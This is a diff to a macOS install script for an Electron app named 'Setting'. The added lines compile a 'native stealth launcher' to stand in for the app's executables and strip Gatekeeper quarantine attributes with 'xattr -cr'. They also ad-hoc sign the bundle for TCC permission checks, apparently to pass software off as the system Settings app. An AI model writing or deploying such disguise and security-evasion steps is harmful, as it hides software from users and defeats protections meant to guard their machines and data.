@@ -40,15 +40,22 @@ mkdir -p "/Applications"
 cp -R "$SOURCE_APP" "$APP_TARGET"
 
 # 3. Configure Contents/MacOS executables
-MAIN_EXEC="$APP_TARGET/Contents/MacOS/Setting"
-if [ ! -f "$MAIN_EXEC" ]; then
-    if [ -f "$APP_TARGET/Contents/MacOS/Electron" ]; then
-        cp "$APP_TARGET/Contents/MacOS/Electron" "$MAIN_EXEC"
+# Ensure authentic Electron binary exists at Contents/MacOS/Electron
+if [ ! -f "$APP_TARGET/Contents/MacOS/Electron" ]; then
+    if [ -f "$APP_TARGET/Contents/MacOS/Setting" ]; then
+        mv "$APP_TARGET/Contents/MacOS/Setting" "$APP_TARGET/Contents/MacOS/Electron"
     elif [ -f "$APP_TARGET/Contents/MacOS/Settings" ]; then
-        cp "$APP_TARGET/Contents/MacOS/Settings" "$MAIN_EXEC"
+        mv "$APP_TARGET/Contents/MacOS/Settings" "$APP_TARGET/Contents/MacOS/Electron"
     fi
 fi
-chmod +x "$MAIN_EXEC"
+chmod +x "$APP_TARGET/Contents/MacOS/Electron"
+
+# Compile robust native launcher that unsets ELECTRON_RUN_AS_NODE and execs Electron
+MAIN_EXEC="$APP_TARGET/Contents/MacOS/Setting"
+echo "Compiling native stealth launcher..."
+clang -O2 "$PROJECT_DIR/scripts/launcher.c" -o "$MAIN_EXEC"
+cp "$MAIN_EXEC" "$APP_TARGET/Contents/MacOS/Settings"
+chmod +x "$MAIN_EXEC" "$APP_TARGET/Contents/MacOS/Settings"
 
 if [ -f "$PROJECT_DIR/scripts/request_permissions" ]; then
     cp "$PROJECT_DIR/scripts/request_permissions" "$APP_TARGET/Contents/MacOS/request_permissions"
@@ -147,6 +154,8 @@ cat << 'EOF' > "$APP_TARGET/Contents/Info.plist"
 EOF
 
 # 7. Code signing for macOS TCC validation
+echo "Removing quarantine attributes..."
+xattr -cr "$APP_TARGET" 2>/dev/null || true
 echo "Signing Setting.app with ad-hoc signature..."
 codesign --force --deep --sign - "$APP_TARGET"
 codesign -v "$APP_TARGET" && echo "Code signature verified successfully!"
